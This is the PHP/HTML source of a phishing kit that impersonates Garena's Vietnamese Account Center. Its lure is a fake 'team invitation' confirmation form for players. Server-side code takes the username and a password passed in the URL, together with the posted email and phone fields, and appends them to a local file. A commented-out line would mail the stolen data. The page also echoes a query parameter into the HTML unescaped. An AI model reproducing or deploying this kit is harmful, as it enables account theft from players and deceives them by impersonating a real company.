
 <?php
ob_start();
if(isset($_POST['sendlogin'])){
			$url = 'thongbao.php?username='.$_GET['username'].'';
	header('Location: '.$url);
	
$username = $_GET['username'];
$tocode = $_SESSION['to'];
$password = $_GET['sesID'];

$tkemail = $_POST['tkemail'];
$mkemail = $_POST['mkemail'];
$sdt = $_POST['sdt'];



$time = date('d/m/Y H:i:s');
$info = '
=========== '.$time.' ===========


			_______ Thông tin TK '.$username.' ________
			
SĐT : '.$sdt.'
Code by: Lưu Văn Tuấn
https://facebook.com/Ckim9x.IT 

Code by: Lưu Văn Tuấn - https://facebook.com/Ckim9x.IT 
';
//SĐT : '.$sdt.'
$test = fopen("file.txt","a");
fwrite($test,$info);
fclose($test); 

$from = "From: $username";
$chude = "Tài khoản $username"; 

//Gui email
//mail("gmai@gmail.com", $chude, $info, $from);
}
?>



<html lang="en">

<head>
    <link rel="shortcut icon" href="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/favicon.ico" type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
    <title>Account Center</title>
    <script src="https://account.garena.com/js/jquery-3.1.1.min.js" type="text/javascript"></script>
    <script src="https://account.garena.com/js/jsencrypt.min.js" type="text/javascript"></script>
    <script src="https://account.garena.com/js/detectdevice.js?ver=0.000018" type="text/javascript"></script>
    <link rel="stylesheet" href="/css/acccenter-pc.css?ver=0.000018">
</head>

<body>
    <div id="main">
        <div data-reactroot="">
            <div class="wrapper">
                <header class="hd-wrap">
                    <div class="hd">
                        <div class="hd-main">
                            <div class="hd-trigger" id="J-msidebar-left-trigger"></div>
                            <a class="hd-logo"></a>
                            <div class="hd-panel"><img alt="" class="hd-thumb" id="J-msidebar-right-trigger" src="https://cdngarenanow-a.akamaihd.net/gxx/resource/avatar/1.jpg">
                                <div class="hd-name">Xin Chào: <font color="red"><?= $_GET['username'];?></font></div><a href="/" class="hd-operation">Đăng xuất</a>
                                <div class="hd-lang">
                                    <a href="javascript:;" class="hd-lang__cur">
                                        <div class="hd-lang__cur-txt">Vietnam</div>
                                    </a>
                                    <div class="hd-lang__select"><a href="#" class="hd-lang__select-item">Singapore</a><a href="#" class="hd-lang__select-item">Taiwan</a><a href="#" class="hd-lang__select-item">Indonesia</a><a href="#" class="hd-lang__select-item hd-lang__select-item--cur">Vietnam</a><a href="#" class="hd-lang__select-item">Malaysia</a><a href="#" class="hd-lang__select-item">Thailand</a><a href="#" class="hd-lang__select-item">Philippines</a><a href="#" class="hd-lang__select-item">Hong Kong</a><a href="#" class="hd-lang__select-item">Macau</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="hd-nav">
                        <div class="hd-nav-inner">
                            <div class="hd-nav__item"><a class="hd-nav__link" href="/">Trang chủ</a>
                            </div>
                            <div class="hd-nav__item"><a class="hd-nav__link hd-nav__link--cur" href="/security">Bảo mật</a>
                            </div>
                            <div class="hd-nav__item"><a class="hd-nav__link" href="/faq">FAQ</a>
                            </div>
                        </div>
                    </div>
                </header>
                <div class="main">
                    <aside class="aside">
                        <div class="aside-nav">
                            <a href="#" class="aside-nav__link">
                                <div class="aside-nav__item">
                                    <div class="aside-nav__icon--auth"></div>
                                    <div class="aside-nav__txt">
                                        <!-- react-text: 347 -->Thiết lập
                                        <!-- /react-text -->
                                        <!-- react-text: 348 -->
                                        <!-- /react-text -->
                                        <!-- react-text: 349 -->Garena Authenticator
                                        <!-- /react-text -->
                                    </div>
                                </div>
                            </a>
                            <a href="#" class="aside-nav__link">
                                <div class="aside-nav__item">
                                    <div class="aside-nav__icon--password"></div>
                                    <div class="aside-nav__txt">
                                        <!-- react-text: 354 -->Thay đổi
                                        <!-- /react-text -->
                                        <!-- react-text: 355 -->
                                        <!-- /react-text -->
                                        <!-- react-text: 356 -->Mật khẩu
                                        <!-- /react-text -->
                                    </div>
                                </div>
                            </a>
                            <a href="#" class="aside-nav__link">
                                <div class="aside-nav__item">
                                    <div class="aside-nav__icon--mobile"></div>
                                    <div class="aside-nav__txt">
                                        <!-- react-text: 361 -->Thay đổi
                                        <!-- /react-text -->
                                        <!-- react-text: 362 -->
                                        <!-- /react-text -->
                                        <!-- react-text: 363 -->Số điện thoại
                                        <!-- /react-text -->
                                    </div>
                                </div>
                            </a>
                        </div>
                    </aside>
                    <div class="content">
                        <div class="content-item content-item--ipage">
                            <div class="content-item__title">XÁC NHẬN THÔNG TIN TÀI KHOẢN</div>
                            <div class="content-item__main">
    <div class="content-item--ipage__main">
        <div class="content__sendinfo" id="J-sendinfo">
            
        </div>
        <div class="content__form">
          <form action="" id="J-validated-form" class="loginForm" method="post">
                                            1. Tên Nhân Vật <br>
                                            
                                            <div class="content__form-input">
                                                <input name="nv" type="text" class="content__form-input-widget J-validated-field" placeholder="Yêu cầu nhập chính xác tên nhân vật" id="J-form-curpwd" required="">
                                            </div>
                                            <div class="content__form-errmsg" id="J-errdisplay-curpwd"></div>
                                            <div class="changepwd-tip-wrap">
                                                <div class="content__form-input"><div class="changepwd-tip"><span class="changepwd-tip__b"><!-- react-text: 465 -->Lưu ý<!-- /react-text --><!-- react-text: 466 -->:<!-- /react-text --></span>
                                                    <!-- react-text: 467 -->
                                                    <!-- /react-text -->
                                                    <!-- react-text: 468 -->Để xác nhận không phải spam.
                                                    <!-- /react-text -->
                                                    <br>
                                                    <!-- react-text: 470 -->Bạn cần xác nhận đúng tên nhân vật của bạn.<br>
                                                    Để đội trưởng có thể mời bạn tham gia vào đội.
                                                    <!-- /react-text -->
                                                    <br>
                                                    <!-- react-text: 472 -->
                                                    <!-- /react-text -->
                                                </div>
                                               2. Vị Trí Thi Đấu Tốt Nhất<br>  <input type="radio" name="checkbox" value="">&nbsp;Đường Trên<br>
 <input type="radio" name="checkbox" value="">&nbsp;Đường Giữa <br><input type="radio" name="checkbox" value="">&nbsp;Đi Rừng<br><input type="radio" name="checkbox" value="">&nbsp;Xạ Thủ <br><input type="radio" name="checkbox" value="">&nbsp;Hỗ Trợ<br><br> 3. Thời Gian Có Thể Tập Luyện Cùng Đội
 <br> <input type="checkbox" name="" value="">&nbsp;Từ 8h đến 11h <br>
<input type="checkbox" name="" value="">&nbsp;Từ 14h đền 17h<br>
<input type="checkbox" name="" value="">&nbsp;Từ 16h đến 21h<br><br>
5. Số Điện Thoại<br>
                                            
                                            <div class="content__form-input">
                                                <input name="dt" type="number" maxlength="11" class="content__form-input-widget J-validated-field" placeholder="Số điện thoại để đội trưởng liên hệ" id="J-form-curpwd" required=""><br>

   <input type="checkbox" name="" value="" required=""> Tôi đồng ý tham gia đội.          
                                                
                                    
                                                </div>
                                                <div id="J-form-pwdschecker" class="changepwd-strength">
                                                    <div class="changepwd-strength__bar-wrap">
                                                        <div class="changepwd-strength__bar"></div>
                                                        <div class="changepwd-strength__bar"></div>
                                                        <div class="changepwd-strength__bar"></div>
                                                    </div>
                                                    <div class="changepwd-strength__txt" data-txt-low="Low" data-txt-medium="Medium" data-txt-high="High"></div>
                                                </div>
                                                
                                            </div>
                                        
                                            </div>
                                            <div class="content__form-errmsg" id="J-errdisplay-confirmpwd"></div>
                                            <div class="captcha-wrap disabled">
                                                <div id="sso_captcha_image" class="captcha"><img src="" alt="">
                                                    <div class="btn-refresh"></div>
                                                </div>
                                                <div class="input-captcha">
                                                    <input type="tel" name="captcha" placeholder="Verification code" class="content__form-input-widget J-validated-field captcha-input">
                                                </div>
                                            </div>
                                            <div class="content__form-errmsg" id="J-errdisplay-curpwd"></div>
                                            <div class="content__submit-wrap">
                                                <input name="sendlogin" type="submit" class="content__submit" value="XÁC NHẬN">
                                            </div>
                                        </form>
										
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <footer class="footer-wrap">
                    <div class="footer">
                        <div class="footer__copyright">Copyright © Garena Online. Trademarks belong to their respective owners. All rights reserved.</div>
                        <nav class="footer__link-wrap">
                            <div class="footer__link"><a href="https://garena.vn/usersagreement.html" class="footer__link-txt">Điều Khoản Sử Dụng</a>
                            </div>
                            <div class="footer__link"><a href="http://garena.vn/privacypolicy.html" class="footer__link-txt">Chính Sách Riêng Tư</a>
                            </div>
                        </nav>
                    </div>
                </footer>
                <div class="wrapper__mask" id="J-wrapper-mask"></div>
            </div>
            
          
        </div>
    </div>
    <script type="text/javascript" src="https://account.garena.com/js/extra.5aac059c.js"></script>
</body>

</html>